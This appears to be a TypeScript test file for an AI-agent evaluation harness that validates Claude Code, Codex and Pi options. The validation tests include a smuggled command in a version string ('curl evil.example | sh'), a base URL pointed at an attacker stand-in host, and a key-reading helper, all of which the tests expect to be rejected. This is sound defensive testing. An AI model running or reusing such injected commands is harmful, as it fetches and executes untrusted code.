import { expect, test } from "bun:test";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { harnessOptionsFromFlags } from "../src/api/cli/conditions.js";
import { conditionSchema } from "../src/contracts/conditions.js";
import { harnessOptionsSchema } from "../src/contracts/harness-options.js";
import type { ComparisonDraft } from "../src/evaluation/comparisons.js";
import { conditionArguments, runCondition } from "../src/evaluation/conditions.js";
import { evaluationServer } from "./support/evaluation-fixture.js";

const problem = (options: unknown) =>
  harnessOptionsSchema.safeParse(options).error?.issues[0]?.message;

test("harness options take only each harness's own options, with values of their kind", () => {
  expect(
    harnessOptionsSchema.parse({
      "claude-code": {
        max_turns: 30,
        append_system_prompt: "Run the tests first.",
        version: "2.1.3",
      },
      codex: { web_search: "disabled" },
      pi: {},
    }),
  ).toEqual({
    "claude-code": {
      max_turns: 30,
      append_system_prompt: "Run the tests first.",
      version: "2.1.3",
    },
    codex: { web_search: "disabled" },
  });
  expect(problem({ "claude-code": { max_steps: 3 } })).toBe(
    "max_steps is not a Claude Code option",
  );
  expect(problem({ "claude-code": { max_turns: "many" } })).toBe(
    "Claude Code Max Turns is a whole number",
  );
  expect(problem({ codex: { web_search: "sometimes" } })).toBe(
    "Codex Web Search is one of disabled, cached, live",
  );
  // Harbor writes a version into the agent's install command.
  expect(problem({ "claude-code": { version: "2.1.3; curl evil.example | sh" } })).toBe(
    "Claude Code Version is a version, like 2.1.3",
  );
  // SelfBench sets the model, its reasoning level, and where it is served, never a condition.
  for (const owned of ["reasoning_effort", "base_url", "fallback_model", "memory_dir"])
    expect(problem({ "claude-code": { [owned]: "x" } })).toBe(
      `${owned} is not a Claude Code option`,
    );
});

test("Claude Code always runs in bypass mode, so its permission mode is fixed", () => {
  expect(problem({ "claude-code": { permission_mode: "bypassPermissions" } })).toBeUndefined();
  expect(problem({ "claude-code": { permission_mode: "default" } })).toBe(
    "Claude Code Permission Mode is always bypassPermissions",
  );
  expect(problem({ codex: { permission_mode: "default" } })).toBe(
    "permission_mode is not a Codex option",
  );
});

test("a native config can't change the trial's model, route, or key", () => {
  const config = (harness: string, value: unknown) => problem({ [harness]: { config: value } });
  expect(
    config("claude-code", { env: { BASH_MAX_TIMEOUT_MS: "600000" }, permissions: { deny: [] } }),
  ).toBeUndefined();
  expect(config("codex", { sandbox_mode: "workspace-write" })).toBeUndefined();
  expect(config("claude-code", { env: { ANTHROPIC_BASE_URL: "https://evil.example" } })).toBe(
    "Claude Code Native Config can't set env.ANTHROPIC_BASE_URL: the run's model and its route are set by SelfBench",
  );
  expect(config("claude-code", { env: { CLAUDE_CODE_SUBAGENT_MODEL: "opus" } })).toContain(
    "env.CLAUDE_CODE_SUBAGENT_MODEL",
  );
  expect(config("claude-code", { apiKeyHelper: "cat /key" })).toContain("apiKeyHelper");
  expect(config("claude-code", { model: "opus" })).toContain("can't set model");
  expect(config("codex", { model_provider: "mine" })).toContain("model_provider");
  expect(config("codex", { model_reasoning_effort: "high" })).toContain("model_reasoning_effort");
  expect(config("codex", { mcp_servers: { docs: { bearer_token: "x", api_key: "y" } } })).toContain(
    "mcp_servers.docs.api_key",
  );
  expect(config("claude-code", "/etc/claude.json")).toBe(
    "Claude Code Native Config is a JSON object",
  );
  expect(config("pi", {})).toBe("config is not a Pi option");
});

test("harness options reach only their own harness, as JSON Harbor parses back", () => {
  const condition = runCondition(
    conditionSchema.parse({
      name: "Short Leash",
      skills: [],
      harnessOptions: {
        "claude-code": { max_turns: 30, append_system_prompt: "true", config: { env: { A: "1" } } },
      },
    }),
  );
  expect(conditionArguments(condition, "claude-code")).toEqual([
    "--agent-kwarg",
    'append_system_prompt="true"',
    "--agent-kwarg",
    'config={"env":{"A":"1"}}',
    "--agent-kwarg",
    "max_turns=30",
  ]);
  expect(conditionArguments(condition, "codex")).toEqual([]);
});

test("a condition's id follows its options, not how they were written", () => {
  const legacy = { name: "Docs", skills: [], instructions: "Read the docs first." };
  // A condition without options keeps the id it had before options existed.
  expect(runCondition(legacy).id).toBe("1d6f8f30b96f");
  const options = (value: unknown) =>
    runCondition(conditionSchema.parse({ ...legacy, harnessOptions: value })).id;
  const one = options({ "claude-code": { max_turns: 30, config: { b: 1, a: 2 } } });
  expect(options({ "claude-code": { config: { a: 2, b: 1 }, max_turns: 30 } })).toBe(one);
  expect(options({ "claude-code": { max_turns: 31, config: { a: 2, b: 1 } } })).not.toBe(one);
  expect(options({ "claude-code": {} })).toBe(runCondition(legacy).id);
});

test("the CLI reads HARNESS.OPTION=VALUE as JSON when it is, as text otherwise, or from a file", async () => {
  const directory = await mkdtemp(join(tmpdir(), "harness-options-"));
  try {
    const settings = join(directory, "settings.json");
    await writeFile(settings, '{"env":{"A":"1"}}');
    expect(
      await harnessOptionsFromFlags([
        "claude-code.max_turns=30",
        "claude-code.append_system_prompt=Run the tests first.",
        `claude-code.config=@${settings}`,
        "codex.web_search=disabled",
        // Text options stay as written, though they read as JSON numbers.
        "claude-code.version=2.10",
        "claude-code.max_budget_usd=10",
      ]),
    ).toEqual({
      "claude-code": {
        max_turns: 30,
        append_system_prompt: "Run the tests first.",
        config: { env: { A: "1" } },
        version: "2.10",
        max_budget_usd: "10",
      },
      codex: { web_search: "disabled" },
    });
    expect(await harnessOptionsFromFlags([])).toBeUndefined();
    await expect(harnessOptionsFromFlags(["max_turns=30"])).rejects.toThrow(
      "write HARNESS.OPTION=VALUE",
    );
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});

test("a condition with harness options runs only on the harnesses it names", async () => {
  const fixture = await evaluationServer();
  const post = (body: unknown) => ({ method: "POST", body: JSON.stringify(body) });
  try {
    const save = async (kind: string) =>
      (
        await (
          await fixture.request(
            "/api/orgs/avyay/credentials",
            post({ kind, name: kind, value: `fake-${kind}` }),
          )
        ).json()
      ).id as string;
    const credentialId = await save("openrouter");
    const sandboxCredentialId = await save("e2b");
    const condition = { name: "30 Turns", harnessOptions: { "claude-code": { max_turns: 30 } } };
    const draft: ComparisonDraft = {
      id: crypto.randomUUID(),
      tasks: [{ runId: "run-one", taskId: "task-one" }],
      sandbox: "e2b",
      sandboxCredentialId,
      models: [{ catalogId: "gpt-6-sol", credentialId, harnesses: ["pi", "claude-code"] }],
      conditions: [condition as never],
    };
    const started = await fixture.request(`${fixture.base}/comparisons`, post(draft));
    expect(started.status).toBe(202);
    expect(
      fixture.starts.map((input) => [input.condition?.name ?? "Baseline", input.harnesses]),
    ).toEqual([
      ["Baseline", ["pi", "claude-code"]],
      ["30 Turns", ["claude-code"]],
    ]);
    expect(fixture.starts[1]?.condition?.harnessOptions).toEqual({
      "claude-code": { max_turns: 30 },
    });

    const unmatched = await fixture.request(
      `${fixture.base}/comparisons`,
      post({
        ...draft,
        id: crypto.randomUUID(),
        models: [{ catalogId: "gpt-6-sol", credentialId, harnesses: ["pi"] }],
      }),
    );
    expect(await unmatched.json()).toEqual({
      error: "30 Turns sets options for Claude Code, which no picked model runs",
    });
    const invalid = await fixture.request(
      `${fixture.base}/comparisons`,
      post({
        ...draft,
        id: crypto.randomUUID(),
        conditions: [{ name: "Bad", harnessOptions: { "claude-code": { base_url: "x" } } }],
      }),
    );
    expect(invalid.status).toBe(400);
    expect(fixture.starts).toHaveLength(2);
  } finally {
    await fixture.close();
  }
});
